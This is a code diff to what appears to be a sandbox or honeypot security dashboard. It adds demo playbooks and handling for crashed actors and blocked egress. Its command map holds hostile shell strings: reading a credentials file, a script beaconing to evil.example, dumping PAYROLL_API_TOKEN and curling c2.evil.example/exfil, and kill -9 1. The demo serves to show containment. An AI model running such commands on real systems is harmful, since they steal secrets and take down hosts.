@@ -1754,6 +1754,18 @@
                 </svg>
                 <span>4. Wipe Tracks (rm -rf)</span>
               </button>
+              <button type="button" class="btn" onclick="runPlaybook(5)">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+                <span>5. Egress &amp; ate-secret://</span>
+              </button>
+              <button type="button" class="btn danger" onclick="runPlaybook(6)">
+                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/>
+                </svg>
+                <span>6. Crash PID 1 (kill -9 1)</span>
+              </button>
             </div>
 
             <div class="terminal-frame">
@@ -1805,6 +1817,14 @@
                 <button type="button" class="quick-chip wipe" onclick="runPlaybook(4)">
                   <kbd>Alt+4</kbd>
                   <span>rm -f rootkit.sh</span>
+                </button>
+                <button type="button" class="quick-chip" onclick="runPlaybook(5)">
+                  <kbd>Alt+5</kbd>
+                  <span>curl C2 &amp; ate-secret://</span>
+                </button>
+                <button type="button" class="quick-chip wipe" onclick="runPlaybook(6)">
+                  <kbd>Alt+6</kbd>
+                  <span>kill -9 1 (CRASHED)</span>
                 </button>
               </div>
             </div>
@@ -2123,7 +2143,7 @@
         toggleDirectorView();
         return;
       }
-      if (ev.altKey && (ev.key === "1" || ev.key === "2" || ev.key === "3" || ev.key === "4")) {
+      if (ev.altKey && (ev.key === "1" || ev.key === "2" || ev.key === "3" || ev.key === "4" || ev.key === "5" || ev.key === "6")) {
         ev.preventDefault();
         runPlaybook(Number(ev.key));
         return;
@@ -2140,7 +2160,9 @@
       1: "id && uname -a && ls -la",
       2: "cat /tmp/honeypot/payroll_db_credentials.env.bak",
       3: "printf '#!/bin/sh\\ncurl -s https://evil.example/beacon\\n' > rootkit.sh && chmod +x rootkit.sh && ls -la",
-      4: "rm -f rootkit.sh && ls -la"
+      4: "rm -f rootkit.sh && ls -la",
+      5: "env | grep PAYROLL_API_TOKEN && curl -sS --connect-timeout 2 https://c2.evil.example/exfil",
+      6: "kill -9 1"
     };
 
     function pulseMirror() {
@@ -2546,7 +2568,7 @@
         }
         const btn = document.createElement("button");
         btn.type = "button";
-        const isActive = snap.version === (data.snapshot_version || 1) && !hasDeletedFiles;
+        const isActive = snap.version === (data.snapshot_version || 1) && !hasDeletedFiles && data.status !== "CRASHED";
         btn.className = "snap-node" + (isActive ? " active" : "");
         btn.textContent = "v" + snap.version + " • " + (snap.reason || "Checkpoint");
         btn.title = "Click to revert actor to snapshot v" + snap.version;
@@ -2554,7 +2576,17 @@
         nodes.push(btn);
       });
 
-      if (hasDeletedFiles) {
+      if (data.status === "CRASHED") {
+        const arrow = document.createElement("span");
+        arrow.className = "snap-arrow";
+        arrow.textContent = "->";
+        nodes.push(arrow);
+
+        const crashNode = document.createElement("span");
+        crashNode.className = "snap-node wiped-head";
+        crashNode.textContent = "LIVE HEAD • STATE=CRASHED (Click v" + (data.snapshot_version || 1) + " or Revert to Recover)";
+        nodes.push(crashNode);
+      } else if (hasDeletedFiles) {
         const arrow = document.createElement("span");
         arrow.className = "snap-arrow";
         arrow.textContent = "->";
@@ -2609,6 +2641,9 @@
 
         const dotSpan = document.createElement("span");
         dotSpan.className = "dot " + (a.status === "SUSPENDED" ? "suspended" : "running");
+        if (a.status === "CRASHED") {
+          dotSpan.style.background = "var(--sig-crimson-bright)";
+        }
 
         const labelSpan = document.createElement("span");
         labelSpan.textContent = a.label;
@@ -2627,7 +2662,10 @@
 
       // Bay 01: Actor State & Compute
       const stateEl = document.getElementById("socActorState");
-      if (data.status === "SUSPENDED") {
+      if (data.status === "CRASHED") {
+        stateEl.textContent = "CRASHED (RESUME REFUSED)";
+        stateEl.style.color = "var(--sig-crimson-bright)";
+      } else if (data.status === "SUSPENDED") {
         stateEl.textContent = "SUSPENDED IN GCS ($0/hr)";
         stateEl.style.color = "var(--sig-amber-bright)";
       } else {
@@ -2781,6 +2819,20 @@
         auditNodes.push(proofDiv);
       }
 
+      if (f.egress_security_proof) {
+        const egressDiv = document.createElement("div");
+        egressDiv.className = "audit-row";
+        egressDiv.style.color = "var(--sig-emerald-bright)";
+        const ep = f.egress_security_proof;
+        egressDiv.textContent =
+          "[Egress & MITM Proof] " +
+          (ep.policy_name || "default") +
+          " (" + (ep.default_action || "DENY_ALL_UNLISTED_EGRESS") + ") • PAYROLL_API_TOKEN=" +
+          (ep.credential_injection_uri || "ate-secret://...") +
+          " • Blocked C2: " + (ep.blocked_egress_attempts || 0);
+        auditNodes.push(egressDiv);
+      }
+
       (f.forensic_audit_trail || []).slice().reverse().forEach(ev => {
         const row = document.createElement("div");
         row.className = "audit-row";
@@ -2896,6 +2948,15 @@
         headers: {"Content-Type": "application/json"},
         body: JSON.stringify({actor_name: currentActor, cmd: remoteCmd})
       });
+      if (res.status === 409) {
+        const errText = await res.text();
+        appendTerm(currentActor, remoteCmd === cmd ? cmd : remoteCmd, {
+          stderr: "[409 Conflict] " + errText.trim() + "\n",
+          exit_code: 137
+        }, cwdBefore);
+        if (input) input.focus();
+        return;
+      }
       if (!res.ok) return;
       const data = await res.json();
       appendTerm(currentActor, remoteCmd === cmd ? cmd : remoteCmd, data.shell, cwdBefore);
